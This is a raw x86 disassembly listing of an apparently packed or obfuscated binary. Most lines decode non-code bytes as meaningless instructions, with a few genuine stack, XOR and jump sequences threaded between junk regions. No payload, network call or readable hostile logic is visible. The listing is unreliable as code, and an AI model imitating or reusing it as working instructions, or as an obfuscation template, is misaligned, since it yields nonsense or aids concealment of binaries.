  415177:	shl    BYTE PTR [edx],1
  415179:	adc    eax,DWORD PTR [eax+eiz*1]
  41517c:	fwait
  41517d:	(bad)  
  41517e:	mov    esi,0x6589e02b
  415183:	fmul   QWORD PTR [ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fdecstp 
  4151a5:	and    BYTE PTR [ecx+0x7f05edba],al
  4151ab:	jo     0x415166
  4151ad:	jle    0x41521f
  4151af:	jo     0x4151e6
  4151b1:	mov    ah,0x46
  4151b3:	aam    0x70
  4151b5:	adc    edx,DWORD PTR es:[edx+0x66cbc844]
  4151bc:	inc    edi
  4151bd:	loopne 0x4151fc
  4151bf:	dec    ecx
  4151c0:	ja     0x41522b
  4151c2:	and    al,0xce
  4151c4:	adc    dl,ch
  4151c6:	mov    ebx,0x42602002
  4151cb:	add    bl,BYTE PTR [ebx+0x7c]
  4151ce:	mov    eax,0x3daab239
  4151d3:	imul   ebx,DWORD PTR [ebp-0x405a84ac],0x4b
  4151da:	nop
  4151db:	cmp    DWORD PTR [edi+0x7d9662a8],esp
  4151e1:	pop    esi
  4151e2:	cmp    eax,0x6aea5dbd
  4151e7:	add    al,0xd1
  4151e9:	imul   eax
  4151eb:	pop    edx
  4151ec:	cmp    eax,0xb85db454
  4151f1:	jno    0x41517d
  4151f3:	cli    
  4151f4:	push   0x46
  4151f6:	xchg   ebx,eax
  4151f7:	mov    eax,ds:0x8b0d02d4
  4151fc:	mov    cl,0x3d
  4151fe:	mov    ebp,0xdc572195
  415203:	cmc    
  415204:	adc    cl,0x2
  415207:	mov    eax,0xe6ff0bf2
  41520c:	les    esp,FWORD PTR [edi]
  41520e:	sbb    al,0xc7
  415210:	scas   eax,DWORD PTR es:[edi]
  415211:	jnp    0x41523a
  415213:	ins    BYTE PTR es:[edi],dx
  415214:	sub    cl,cl
  415216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415217:	add    al,BYTE PTR [ecx+ebx*4]
  41521a:	push   0x849d3d2c
  41521f:	xchg   ebx,eax
  415220:	cs (bad) 
  415222:	adc    BYTE PTR [edx],cl
  415224:	icebp  
  415225:	cmp    esi,DWORD PTR [ebx-0xf97e7fa]
  41522b:	pop    ebx
  41522c:	sahf   
  41522d:	adc    BYTE PTR [ecx+0x15f74383],0x61
  415234:	lock adc BYTE PTR [eax+0x5cbd6509],0x53
  41523c:	xchg   edx,eax
  41523d:	popf   
  41523e:	imul   ebp,DWORD PTR [ebx+0x56150a3c],0x78
  415245:	outs   dx,DWORD PTR ds:[esi]
  415246:	sub    ebp,eax
  415248:	jbe    0x41520c
  41524a:	(bad)  
  41524b:	ins    BYTE PTR es:[edi],dx
  41524c:	cld    
  41524d:	popa   
  41524e:	lock sar DWORD PTR [ebx-0x1b06274e],1
  415255:	xor    DWORD PTR [ebp+0x28],0xffffff95
  415259:	inc    ebp
  41525a:	jp     0x415224
  41525c:	xor    esi,edi
  41525e:	test   eax,0x5aa2678b
  415263:	popf   
  415264:	in     al,0x46
  415266:	ins    BYTE PTR es:[edi],dx
  415267:	repz dec esp
  415269:	dec    eax
  41526a:	retf   0xe7ab
  41526d:	and    eax,0xdf9918e7
  415272:	scas   eax,DWORD PTR es:[edi]
  415273:	sub    al,0x6a
  415275:	jmp    0xbb360fb
  41527a:	jmp    0x41529f
  41527c:	pop    ebx
  41527d:	in     eax,dx
  41527e:	inc    edi
  41527f:	rol    dh,0x6e
  415282:	retf   0x2cf
  415285:	mov    WORD PTR [esi+eiz*4-0x7321166],gs
  41528c:	and    bl,BYTE PTR [ebx]
  41528e:	cmp    BYTE PTR [eax+0x41],cl
  415291:	repnz mov eax,ds:0xe1daec01
  415297:	(bad)  [ebp-0x15]
  41529a:	aad    0x58
  41529c:	mov    WORD PTR [edi+0x17],ds
  41529f:	enter  0x1c74,0x6e
  4152a3:	dec    esi
  4152a4:	lods   eax,DWORD PTR ds:[esi]
  4152a5:	xchg   DWORD PTR [esp+edi*8+0x54],esp
  4152a9:	(bad)  
  4152aa:	int    0xdb
  4152ac:	pop    esp
  4152ad:	in     eax,dx
  4152ae:	iret   
  4152af:	mov    cl,0x4
  4152b1:	mov    bl,0x55
  4152b3:	or     ebx,ebx
  4152b5:	or     BYTE PTR [ecx+0x46],ah
  4152b8:	aaa    
  4152b9:	jo     0x415313
  4152bb:	test   BYTE PTR [eax],al
  4152bd:	pop    ds
  4152be:	stos   BYTE PTR es:[edi],al
  4152bf:	stos   BYTE PTR es:[edi],al
  4152c0:	sbb    al,BYTE PTR [edi+0x1ead0d8e]
  4152c6:	sbb    al,0x46
  4152c8:	cmp    BYTE PTR [edx-0x1f],dl
  4152cb:	cwde   
  4152cc:	inc    esi
  4152cd:	(bad)  
  4152cf:	lds    ebx,FWORD PTR [ebx]
  4152d1:	out    dx,al
  4152d2:	mov    ebx,0x2998b128
  4152d7:	jle    0x4152c3
  4152d9:	cmp    al,0xa4
  4152db:	add    ebp,DWORD PTR [edi-0x38]
  4152de:	in     al,0x97
  4152e0:	cs jmp 0x541a9c26
  4152e6:	scas   al,BYTE PTR es:[edi]
  4152e7:	cdq    
  4152e8:	adc    cl,BYTE PTR ds:0xce99b514
  4152ee:	int    0x7e
  4152f0:	jne    0x4152cf
  4152f2:	out    dx,eax
  4152f3:	xchg   ebp,eax
  4152f4:	dec    ebx
  4152f5:	jecxz  0x415311
  4152f7:	pop    eax
  4152f8:	dec    ebp
  4152f9:	xchg   ecx,eax
  4152fa:	push   ds
  4152fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152fc:	nop
  4152fd:	fisttp QWORD PTR [edi-0x5d]
  415300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415301:	jo     0x4152ca
  415303:	data16 scas al,BYTE PTR es:[edi]
  415305:	sub    BYTE PTR [ecx+ebx*4+0x1ff4be53],dh
  41530c:	popa   
  41530d:	pop    ecx
  41530e:	rol    eax,1
  415310:	pop    edx
  415311:	js     0x41531f
  415313:	loope  0x415329
  415315:	fdiv   st(1),st
  415317:	cmc    
  415318:	or     eax,0x67d8c9fa
  41531d:	pushf  
  41531e:	test   ch,ch
  415320:	sub    edx,DWORD PTR [edx+0x59414d0e]
  415326:	in     eax,dx
  415327:	adc    edi,DWORD PTR [ecx-0x13]
  41532a:	arpl   cx,di
  41532c:	imul   esi,DWORD PTR [esi],0x3c
  41532f:	fbstp  TBYTE PTR [edx-0x58]
  415332:	or     eax,0xc77fe664
  415337:	inc    edx
  415338:	pusha  
  415339:	repnz push es
  41533b:	enter  0x47d7,0x98
  41533f:	lahf   
  415340:	mov    edi,esi
  415342:	shr    BYTE PTR [esi+0x34e270e4],1
  415348:	outs   dx,BYTE PTR ds:[esi]
  415349:	jl     0x415375
  41534b:	aam    0x7f
  41534d:	push   ebx
  41534e:	pop    ebx
  41534f:	cmp    DWORD PTR [edi],0x828903d4
  415355:	test   eax,0x80a06b80
  41535a:	popa   
  41535b:	scas   eax,DWORD PTR es:[edi]
  41535c:	das    
  41535d:	xchg   esi,eax
  41535e:	lods   eax,DWORD PTR ds:[esi]
  41535f:	clc    
  415360:	repz mov dl,0x82
  415363:	mov    ah,0xe3
  415365:	test   DWORD PTR [ecx-0x4e06bffd],ecx
  41536b:	leave  
  41536c:	outs   dx,DWORD PTR ds:[esi]
  41536d:	aad    0xcd
  41536f:	inc    eax
  415370:	(bad)  
  415371:	pop    esp
  415372:	push   ebx
  415373:	fisubr WORD PTR [ebp+0x42]
  415376:	pop    edi
  415377:	cdq    
  415378:	sbb    BYTE PTR [esi-0x7e70ff37],0xaa
  41537f:	sub    bl,dh
  415381:	mov    al,0xf5
  415383:	push   esi
  415384:	pop    ebp
  415385:	mov    edx,0x46ec20bc
  41538a:	jae    0x4153c4
  41538c:	pushf  
  41538d:	mov    ds:0x6c058bc9,al
  415392:	xchg   ecx,eax
  415393:	clc    
  415394:	lods   al,BYTE PTR fs:[esi]
  415396:	out    dx,al
  415397:	adc    DWORD PTR [ebp-0x3fc9a830],esp
  41539d:	and    eax,0x22c302d5
  4153a2:	mov    cl,ch
  4153a4:	fs pushf 
  4153a6:	jl     0x41537a
  4153a8:	jno    0x41532b
  4153aa:	loopne 0x415427
  4153ac:	ins    BYTE PTR es:[edi],dx
  4153ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153ae:	xchg   edi,eax
  4153af:	std    
  4153b0:	hlt    
  4153b1:	loopne 0x4153d7
  4153b3:	push   cs
  4153b4:	ror    DWORD PTR [ecx],0xc3
  4153b7:	jge    0x4153ad
  4153b9:	jae    0x415386
  4153bb:	pop    ecx
  4153bc:	(bad)
  4153bf:	push   eax
  4153c0:	mov    esp,0x99930d00
  4153c5:	jge    0x415434
  4153c7:	daa    
  4153c8:	pop    ds
  4153c9:	push   edx
  4153ca:	dec    esp
  4153cb:	lea    edx,[ecx-0x24]
  4153ce:	inc    ebp
  4153cf:	add    DWORD PTR [edi+0x79],ebx
  4153d2:	out    dx,eax
  4153d3:	sub    DWORD PTR [edx+0x29],ebp
  4153d6:	xor    ch,BYTE PTR [esi]
  4153d8:	repnz cld 
  4153da:	jl     0x4153f7
  4153dc:	inc    edi
  4153dd:	dec    esp
  4153de:	lds    esi,FWORD PTR [eax+0x28]
  4153e1:	push   esp
  4153e2:	je     0x41539d
  4153e4:	xchg   BYTE PTR ds:0xc9a9cd0a,ah
  4153ea:	icebp  
  4153eb:	enter  0x24c4,0x30
  4153ef:	psubsw mm0,QWORD PTR [eax-0x65637a64]
  4153f6:	mov    dh,0x7a
  4153f8:	cmp    ebx,ecx
  4153fa:	xor    DWORD PTR gs:[edi+0x72ca719],ebp
  415401:	push   ebp
  415402:	mov    fs,esi
  415404:	and    ah,0x4b
  415407:	sub    BYTE PTR [esi+0x3350b7cc],bl
  41540d:	out    0x7c,al
  41540f:	mov    ds:0x4fafc035,eax
  415414:	lea    eax,[ebx-0x23]
  415417:	stos   DWORD PTR es:[edi],eax
  415418:	stos   BYTE PTR es:[edi],al
  415419:	pusha  
  41541a:	push   esi
  41541b:	xchg   esp,eax
  41541c:	mov    ecx,0x15c38dc7
  415421:	repnz mov ecx,0xf7367c20
  415427:	xchg   esi,eax
  415428:	lahf   
  415429:	mov    ?,WORD PTR [eax+0x2]
  41542c:	hlt    
  41542d:	daa    
  41542e:	repnz cmc 
  415430:	out    dx,al
  415431:	or     al,0x8c
  415433:	mov    esp,0x63435533
  415438:	mov    bl,0x1f
  41543a:	fdivr  DWORD PTR [eax+0x1cc7e887]
  415440:	mov    esi,0x249030c1
  415445:	shr    BYTE PTR [esi],1
  415447:	dec    eax
  415448:	inc    edx
  415449:	(bad)  
  41544a:	bound  edi,QWORD PTR [esi]
  41544c:	(bad)  
  41544d:	push   eax
  41544e:	jae    0x415421
  415450:	stos   DWORD PTR es:[edi],eax
  415451:	xlat   BYTE PTR cs:[ebx]
  415453:	aam    0x36
  415455:	div    DWORD PTR [edx]
  415457:	sub    al,BYTE PTR [edi]
  415459:	adc    BYTE PTR [edx],ch
  41545b:	xor    eax,0xbb525d31
  415460:	lea    esp,[esp+edi*4+0x7b268dc9]
  415467:	push   0xf165e1e4
  41546c:	pop    ss
  41546d:	out    dx,al
  41546e:	(bad)  
  415470:	or     eax,esp
  415472:	test   BYTE PTR [edi+0x5],ch
  415475:	xchg   DWORD PTR [ebp+0x3],ebx
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x56
  4154c8:	(bad)  [eax+0x7f02360a]
  4154ce:	jo     0x415489
  4154d0:	jle    0x415542
  4154d2:	jo     0x41548a
  4154d4:	scas   al,BYTE PTR es:[edi]
  4154d5:	xchg   esp,eax
  4154d6:	lods   al,BYTE PTR ds:[esi]
  4154d7:	cmp    BYTE PTR [ecx-0x34],ch
  4154da:	adc    ebx,edi
  4154dc:	cli    
  4154dd:	frstor [edx]
  4154df:	cwde   
  4154e0:	pop    ebx
  4154e1:	mov    eax,ds:0x16c77e9
  4154e6:	sbb    eax,0xa26242ab
  4154eb:	arpl   bx,si
  4154ed:	add    BYTE PTR ss:[ebx],bh
  4154f0:	lock and DWORD PTR [edx],edx
  4154f3:	(bad)  
  4154f4:	stos   BYTE PTR es:[edi],al
  4154f5:	mov    ch,0x19
  4154f7:	jge    0x415522
  4154f9:	sbb    BYTE PTR [edx],dh
  4154fb:	adc    DWORD PTR [ebx+ebx*1+0x22],ebx
  4154ff:	rcr    BYTE PTR [ebp+0xd],cl
  415502:	xor    esi,0xe3388721
  415508:	out    dx,eax
  415509:	jno    0x415584
  41550b:	mov    edi,0xd73d92f0
  415510:	das    
  415511:	mov    edi,0xba683ab3
  415516:	mov    ds:0x8d0a5881,al
  41551b:	ficom  DWORD PTR [eax]
  41551d:	fistp  WORD PTR [ebx-0x3a4840f5]
  415523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415524:	aad    0x16
  415526:	pop    edx
  415527:	add    al,0xc7
  415529:	add    DWORD PTR [ebx+ebx*8],edi
  41552c:	and    al,0x72
  41552e:	push   ds
  41552f:	or     ebx,eax
  415531:	nop
  415532:	test   al,0x8b
  415534:	scas   eax,DWORD PTR es:[edi]
  415535:	cmp    BYTE PTR [ebx],ah
  415537:	sub    cl,BYTE PTR [ebx]
  415539:	stc    
  41553a:	adc    DWORD PTR [ecx],ebx
  41553c:	inc    eax
  41553d:	jecxz  0x415575
  41553f:	ret    
  415540:	mov    dh,0xfe
  415542:	ror    DWORD PTR [edx],cl
  415544:	and    DWORD PTR [ebx-0x45922a56],edx
  41554a:	je     0x4154ee
  41554c:	stos   BYTE PTR es:[edi],al
  41554d:	add    ch,ch
  41554f:	mov    ebx,0x7f190662
  415554:	sbb    ebx,esp
  415556:	sub    BYTE PTR [esi],cl
  415558:	mov    eax,ds:0xf4c6ed29
  41555d:	sbb    edi,DWORD PTR [ebx-0x42d44e50]
  415563:	(bad)  
  415564:	std    
  415565:	and    al,0x79
  415567:	out    dx,al
  415568:	xor    ebp,DWORD PTR [esi]
  41556a:	les    ebx,FWORD PTR [ebx-0x7673a901]
  415570:	sbb    ecx,DWORD PTR [eax]
  415572:	ret    0x3744
  415575:	xchg   edx,eax
  415576:	pop    ss
  415577:	dec    esi
  415578:	dec    ebx
  415579:	xor    BYTE PTR [ebp-0x3c7b4b29],0x39
  415580:	sti    
  415581:	add    ecx,ebx
  415583:	test   al,0x70
  415585:	push   0xf3199764
  41558a:	lods   al,BYTE PTR ds:[esi]
  41558b:	push   ebx
  41558c:	or     esp,esi
  41558e:	out    0x65,eax
  415590:	fld    st(2)
  415592:	fld    DWORD PTR [eax]
  415594:	jo     0x415530
  415596:	sahf   
  415597:	stos   DWORD PTR es:[edi],eax
  415598:	mov    eax,0xf7ab9e4
  41559d:	mov    ah,0xa
  41559f:	pop    es
  4155a0:	sahf   
  4155a1:	jbe    0x4155a4
  4155a3:	push   ds
  4155a4:	jmp    DWORD PTR [eax-0x3e17cf57]
  4155aa:	fist   DWORD PTR [esi+0x79]
  4155ad:	aas    
  4155ae:	dec    eax
  4155af:	mov    eax,ds:0x68a0b946
  4155b4:	retw   
  4155b6:	mov    bh,0x54
  4155b8:	cmp    al,BYTE PTR [ecx+0x473e1ad5]
  4155be:	add    eax,0xb49506d7
  4155c3:	loop   0x4155e0
  4155c5:	outs   dx,DWORD PTR ds:[esi]
  4155c6:	xchg   ebp,eax
  4155c7:	popf   
  4155c8:	jl     0x415635
  4155ca:	or     DWORD PTR [edi],edx
  4155cc:	lods   eax,DWORD PTR ds:[esi]
  4155cd:	outs   dx,BYTE PTR ds:[esi]
  4155ce:	inc    ebx
  4155cf:	cmp    BYTE PTR [eax+0x552d237a],0xcf
  4155d6:	cmp    DWORD PTR [edx],ecx
  4155d8:	inc    ebp
  4155d9:	mov    eax,DWORD PTR [edi+0x9]
  4155dc:	sub    bl,BYTE PTR [eax+0x28]
  4155df:	clc    
  4155e0:	pop    es
  4155e1:	loope  0x415584
  4155e3:	pop    ecx
  4155e4:	imul   ebx,DWORD PTR [eax],0xb038ba67
  4155ea:	push   ds
  4155eb:	mov    ds:0x84dcbfd5,eax
  4155f0:	test   eax,0x5c1f25ee
  4155f5:	mov    WORD PTR [ebx-0x54],cs
  4155f8:	imul   ecx,DWORD PTR [ecx],0x631ca48f
  4155fe:	int    0xfa
  415600:	or     edx,ebp
  415602:	retf   0x2789
  415605:	push   ebx
  415606:	jb     0x415635
  415608:	sbb    BYTE PTR [eax+eax*2],ah
  41560b:	jp     0x415630
  41560d:	ja     0x415623
  41560f:	(bad)  
  415610:	dec    ecx
  415611:	add    edi,ecx
  415613:	mov    eax,ds:0x25afddd1
  415618:	pop    ebp
  415619:	and    eax,0x689da8bf
  41561e:	cdq    
  41561f:	out    0xc3,al
  415621:	push   edi
  415622:	or     al,0x55
  415624:	sub    edx,ecx
  415626:	lock xchg DWORD PTR [edi],esp
  415629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41562a:	sbb    al,0x57
  41562c:	ret    
  41562d:	retf   
  41562e:	fst    QWORD PTR [edi-0x80]
  415631:	das    
  415632:	pop    ebp
  415633:	sahf   
  415634:	scas   eax,DWORD PTR es:[edi]
  415635:	mov    esi,0x22400702
  41563a:	into   
  41563b:	lods   al,BYTE PTR ds:[esi]
  41563c:	xchg   edx,eax
  41563d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41563e:	int3   
  41563f:	in     al,0x14
  415641:	jle    0x41567e
  415643:	popf   
  415644:	or     BYTE PTR [eax+0x47b1e478],dl
  41564a:	and    BYTE PTR [eax-0x6d602603],ch
  415650:	bnd js 0x4156ac
  415653:	(bad)  
  415654:	call   0x718911a9
  415659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565a:	mov    esp,0x4cc67230
  41565f:	or     bh,BYTE PTR [eax+0x42]
  415662:	out    0x8a,eax
  415664:	jge    0x4156cc
  415666:	test   bh,0x93
  415669:	sub    al,0x3b
  41566b:	pop    eax
  41566c:	int3   
  41566d:	pusha  
  41566e:	adc    al,0x35
  415670:	pop    eax
  415671:	fiadd  DWORD PTR [eax]
  415673:	scas   eax,DWORD PTR es:[edi]
  415674:	mov    es,ecx
  415676:	data16 shl BYTE PTR [edi],cl
  415679:	jl     0x4156e2
  41567b:	rol    DWORD PTR [esi-0x6d],1
  41567e:	pushf  
  41567f:	sub    eax,0x20287918
  415684:	cs jae 0x4156ef
  415687:	sbb    eax,0x960ab15c
  41568c:	or     bl,BYTE PTR [ebp+0x35]
  41568f:	pop    ds
  415690:	jno    0x41567b
  415692:	in     al,0x3
  415694:	rcl    DWORD PTR [ecx],1
  415696:	sbb    BYTE PTR [esi-0x8],ah
  415699:	cs inc esi
  41569b:	cmp    DWORD PTR [edi+0x5e65839d],ebp
  4156a1:	idiv   DWORD PTR [eax+ecx*2]
  4156a4:	sbb    DWORD PTR [eax+0x53],esp
  4156a7:	sub    DWORD PTR [edx],esi
  4156a9:	adc    ah,BYTE PTR [esi+0x5d]
  4156ac:	push   edi
  4156ad:	sbb    DWORD PTR [ebx],0xffffff9b
  4156b0:	rcl    BYTE PTR [ecx-0x568d39de],0x64
  4156b7:	inc    ebx
  4156b8:	bound  eax,QWORD PTR [edi+eiz*8-0x59]
  4156bc:	push   eax
  4156bd:	aaa    
  4156be:	idiv   BYTE PTR [edi]
  4156c0:	adc    DWORD PTR [ebp+esi*2+0x526a71b8],ecx
  4156c7:	loop   0x41568a
  4156c9:	fcomi  st,st(2)
  4156cb:	add    dl,BYTE PTR [edx+0x13367d71]
  4156d1:	(bad)  
  4156d2:	das    
  4156d3:	xor    DWORD PTR [ecx],ebx
  4156d5:	das    
  4156d6:	pushf  
  4156d7:	rcr    DWORD PTR [ecx+0x4f],1
  4156da:	xchg   ecx,eax
  4156db:	or     BYTE PTR [ebp+eax*2+0x76],dh
  4156df:	fistp  WORD PTR [ebp+edx*8-0x49]
  4156e3:	xchg   BYTE PTR [edi-0x4ba53e96],bl
  4156e9:	and    eax,0x6c1dac82
  4156ee:	cmp    esp,esi
  4156f0:	xor    eax,0x57a34018
  4156f5:	imul   esi,DWORD PTR [esi-0x41],0xffffffe1
  4156f9:	lods   al,BYTE PTR ds:[esi]
  4156fb:	stos   BYTE PTR es:[edi],al
  4156fc:	and    DWORD PTR [ebx-0x4753fecd],0xffffffb5
  415703:	jns    0x415753
  415705:	mov    bh,0xfd
  415707:	pop    ecx
  415708:	adc    bl,dl
  41570a:	shr    BYTE PTR [ecx+edx*4-0x37],0x15
  41570f:	mov    BYTE PTR [ecx-0x24],ch
  415712:	retf   
  415713:	call   0x1b3:0x10d73fff
  41571a:	jl     0x415775
  41571c:	arpl   WORD PTR ds:0xd286acc3,cx
  415722:	sahf   
  415723:	data16 and BYTE PTR [ebp-0x747b9f46],dl
  41572a:	popf   
  41572b:	in     eax,dx
  41572c:	sub    BYTE PTR [esi-0x5b],ah
  41572f:	push   ds
  415730:	sahf   
  415731:	outs   dx,BYTE PTR ds:[esi]
  415732:	jp     0x4156d3
  415734:	test   al,0x29
  415736:	and    BYTE PTR ds:0x530efa90,0x1e
  41573d:	xchg   edi,eax
  41573e:	inc    esp
  41573f:	adc    eax,0xc83c80fd
  415744:	cmp    ebp,DWORD PTR [esi]
  415746:	push   edi
  415747:	sbb    ebp,esi
  415749:	mov    ch,0xeb
  41574b:	jge    0x415731
  41574d:	test   eax,0xeca50caf
  415752:	inc    esi
  415753:	mov    ds:0x6acb6859,al
  415758:	jne    0x4156e8
  41575a:	loop   0x41575d
  41575c:	sub    BYTE PTR [eax-0x7b],al
  41575f:	repnz ss loop 0x4157ba
  415763:	mov    ah,0xf
  415765:	ds imul esi,ebp,0x164c05c8
  41576c:	inc    ebx
  41576d:	sub    eax,0x2f97a312
  415772:	push   ebp
  415773:	in     eax,0xd4
  415775:	sub    edx,ecx
  415777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415778:	nop
  415779:	jae    0x415761
  41577b:	or     BYTE PTR [esi-0x37],ah
  41577e:	call   DWORD PTR [edi+0x42042ab8]
  415784:	adc    ch,BYTE PTR [ebx]
  415786:	fs jle 0x41579b
  415789:	inc    eax
  41578a:	mov    ebp,0x4331b73b
  41578f:	jecxz  0x415800
  415791:	cli    
  415792:	sbb    al,0xa1
  415794:	mov    ebx,0xe08299a3
  415799:	cmp    BYTE PTR [esi+0x32729c],bh
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [esi+0x1d],bh
  4157b9:	leave  
  4157ba:	mov    edi,0x707f0f7f
  4157bf:	mov    ecx,0x3f70707e
  4157c4:	div    esp
  4157c6:	add    al,0x55
  4157c8:	inc    esp
  4157c9:	or     BYTE PTR [esi],bl
  4157cb:	cdq    
  4157cc:	cmp    dl,BYTE PTR [edx+edi*4]
  4157cf:	xchg   BYTE PTR [eax+0x7a6d3715],dh
  4157d5:	into   
  4157d6:	push   ds
  4157d7:	sahf   
  4157d8:	add    edi,DWORD PTR [ebp+0x4e0dd6e3]
  4157de:	retf   0x5221
  4157e1:	ss dec esi
  4157e3:	jo     0x415809
  4157e5:	adc    eax,0xf7b77ec
  4157ea:	add    ebp,eax
  4157ec:	pop    ecx
  4157ed:	ror    DWORD PTR [ecx+0x66],0x2c
  4157f1:	gs push es
  4157f3:	jnp    0x415803
  4157f5:	mov    al,ds:0xba0820f6
  4157fa:	add    DWORD PTR [edi+edx*4],ebx
  4157fd:	push   ss
  4157fe:	in     al,0x92
  415800:	(bad)  
  415802:	and    al,0x3
  415805:	popf   
  415806:	push   edx
  415807:	mov    esp,0xb5c566ef
  41580c:	fidivr DWORD PTR [edi]
  41580e:	pop    esp
  41580f:	lods   eax,DWORD PTR ds:[esi]
  415810:	call   0x1d99906e
  415815:	sub    ecx,DWORD PTR ds:[esi+0x187427e]
  41581c:	pop    esp
  41581d:	pop    es
  41581e:	lds    ebx,FWORD PTR [eax+0x31]
  415821:	sahf   
  415822:	lea    ebp,[edx-0x67]
  415825:	int    0x42
  415827:	adc    edi,DWORD PTR [ecx-0x6df6ac56]
  41582d:	inc    ebx
  41582e:	test   BYTE PTR [ecx],ch
  415830:	xchg   edx,eax
  415831:	jo     0x415884
  415833:	cmp    DWORD PTR [esi],0x7a
  415836:	cmp    DWORD PTR [eax-0xa],eax
  415839:	xchg   edx,eax
  41583a:	xchg   edx,eax
  41583b:	and    al,0xb6
  41583d:	cld    
  41583e:	pop    esi
  41583f:	rcl    edi,1
  415841:	inc    ebp
  415842:	int    0x16
  415844:	loop   0x4158ac
  415846:	inc    edx
  415847:	xchg   ecx,eax
  415848:	pop    ebp
  415849:	sub    ah,BYTE PTR [esi+0x77]
  41584c:	dec    DWORD PTR [edi+0x3acbc495]
  415852:	(bad)  
  415853:	fimul  DWORD PTR [edx+0x4d]
  415856:	mov    cl,BYTE PTR [ecx]
  415858:	mul    bl
  41585a:	sbb    ecx,DWORD PTR [ebp-0x7c4dc265]
  415860:	mov    dh,0x3e
  415862:	adc    ebp,DWORD PTR [eax+0x4bf0200d]
  415868:	call   0xb15e:0x76e9e11e
  41586f:	mov    esi,0xbe07f337
  415874:	dec    edi
  415875:	fs jg  0x415810
  415878:	fnstsw WORD PTR [eax+0x61]
  41587b:	outs   dx,DWORD PTR ds:[esi]
  41587c:	fwait
  41587d:	not    ecx
  41587f:	sub    edi,DWORD PTR [eax-0x56]
  415882:	outs   dx,BYTE PTR ds:[esi]
  415883:	por    mm6,mm4
  415886:	out    0xa4,al
  415888:	jg     0x415835
  41588a:	jne    0x415828
  41588c:	stos   DWORD PTR es:[edi],eax
  41588d:	cmp    al,0x88
  41588f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415890:	je     0x415866
  415892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415893:	jae    0x41589f
  415895:	xchg   ebp,eax
  415896:	fidivr DWORD PTR [esi]
  415898:	sub    al,0xa6
  41589a:	or     dh,ch
  41589c:	les    ebx,FWORD PTR [edi]
  41589e:	sub    esp,DWORD PTR [eax]
  4158a0:	stos   DWORD PTR es:[edi],eax
  4158a1:	jbe    0x415899
  4158a3:	xchg   edi,eax
  4158a4:	mov    eax,0x4b4e16c0
  4158a9:	mov    ch,0xcc
  4158ab:	push   eax
  4158ac:	cld    
  4158ad:	loopne 0x4158df
  4158af:	jne    0x4158da
  4158b1:	ja     0x415886
  4158b3:	int3   
  4158b4:	scas   al,BYTE PTR es:[edi]
  4158b5:	shl    DWORD PTR [esi+0x75],1
  4158b8:	jmp    DWORD PTR [esi-0x5a]
  4158bb:	fiadd  DWORD PTR [edi-0x238a8cf8]
  4158c1:	daa    
  4158c2:	xchg   ebx,eax
  4158c4:	arpl   WORD PTR [ebx-0x7d],di
  4158c7:	mov    WORD PTR [eax],?
  4158c9:	ret    0xb1da
  4158cc:	into   
  4158cd:	sbb    ebx,esp
  4158cf:	jns    0x4158f9
  4158d1:	add    al,0xd9
  4158d3:	xor    DWORD PTR [esi+0x75a55dfd],ecx
  4158d9:	and    al,BYTE PTR [edx+0x40]
  4158dc:	aas    
  4158dd:	xor    BYTE PTR [edx],0xb3
  4158e0:	or     BYTE PTR [edx],bl
  4158e2:	xor    eax,0x5eed89ba
  4158e7:	mov    bh,ch
  4158e9:	jg     0x415919
  4158eb:	inc    eax
  4158ec:	sbb    eax,0x6cc08549
  4158f1:	jecxz  0x4158cd
  4158f3:	dec    ebp
  4158f4:	mov    esp,0xf5e3454
  4158f9:	in     eax,dx
  4158fa:	xor    ch,BYTE PTR [eax]
  4158fc:	iret   
  4158fd:	xor    BYTE PTR [edx],bl
  4158ff:	ret    
  415900:	xchg   eax,ecx
  415902:	hlt    
  415903:	mov    edi,0x98215096
  415908:	dec    ecx
  415909:	int    0xb2
  41590b:	mov    bh,0x6c
  41590d:	cmc    
  41590e:	imul   DWORD PTR [edi]
  415910:	into   
  415911:	das    
  415912:	aas    
  415913:	test   eax,0x1aec1ca9
  415918:	or     ebx,DWORD PTR [eax-0x2e]
  41591b:	or     dh,ah
  41591d:	mov    ebx,0x6140d675
  415922:	sbb    eax,0x3ceb4270
  415927:	mov    dh,0xda
